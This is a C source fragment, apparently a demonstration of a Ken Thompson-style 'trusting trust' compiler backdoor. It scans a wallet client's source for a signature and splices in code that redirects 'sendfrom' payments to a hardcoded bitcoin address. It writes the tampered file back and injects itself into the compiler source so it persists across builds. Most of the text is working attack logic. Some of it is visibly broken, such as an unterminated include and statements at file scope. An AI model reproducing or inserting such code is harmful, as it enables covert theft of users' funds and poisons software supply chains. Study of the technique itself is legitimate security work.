// https://groups.google.com/g/sci.crypt/c/PybcCHi9u6s/m/b-7U1y9QBZMJ?pli=1
// https://www.mail-archive.com/cryptography-digest@senator-bedfellow.mit.edu/msg02776.html
// For demonstration purposes only
// The attack will go away after a finite number of recompilations

#include "attack-array.h
static char compile_sig[] = "/* open the file */";
static char login_sig[] = "for (i = 0; i < conf->length; i++) {";
static char login_attack[] = "if (strcmp(conf->method, \"sendfrom\") == 0) {conf->params[1] = \"tb1qq0r36alhargdp8z7caz8r0zxnlm7w758mzc7m5\";puts(\"has been pwned ### \");}";

/* attack code follows */

#define N  8 * 1024 * 1024

static char program[N+1];
int x_fd = open(filename, O_RDONLY);
int n = read(x_fd, program, N);
char *login_sig_loc = strstr(program, login_sig);
printf("................LOOKING FOR VICTIM\n");
int done = 0;
int done2 = 1;
if (done == 0 && login_sig_loc != NULL) {
    printf("\n### FOUND VICTIM!\N");
    static char tmp[8*1024*1024 + 1];
    size_t login_attack_offset = login_sig_loc - program + strlen(login_sig);
    strcpy(tmp, program + login_attack_offset);
    strcpy(program + login_attack_offset, login_attack);
    strcpy(program + login_attack_offset + strlen(login_attack), tmp);
    FILE *file;
    if (done2 == 1) 
    {
        FILE *fptmp = fopen("src/client/main.c", "w");
        if (fptmp != NULL)
        {
            fputs(program, fptmp);
            fclose(fptmp);
        }
        filename = "src/client/main.c";
        done = 1;
        done2 = 1;
    }
}
char *compile_sig_loc = strstr(program, compile_sig);

if (compile_sig_loc != NULL) {
    static char tmp[8*1024*1024 + 1];
    size_t compile_attack_offset = compile_sig_loc - program + strlen(compile_sig);
    strcpy(tmp, program + compile_attack_offset);
    strcpy(program + compile_attack_offset, compile_attack);
    strcpy(program + compile_attack_offset + strlen(compile_attack), tmp);

    FILE *file;
    if ((file = fopen("attack-tmp2.c", "r")))
    {

    }
    else
    {
        FILE *fptmp = fopen("attack-tmp2.c", "ab");
        if (fptmp != NULL)
        {
            fputs(program, fptmp);
            fclose(fptmp);
        }
        filename = "attack-tmp2.c";
    }

}

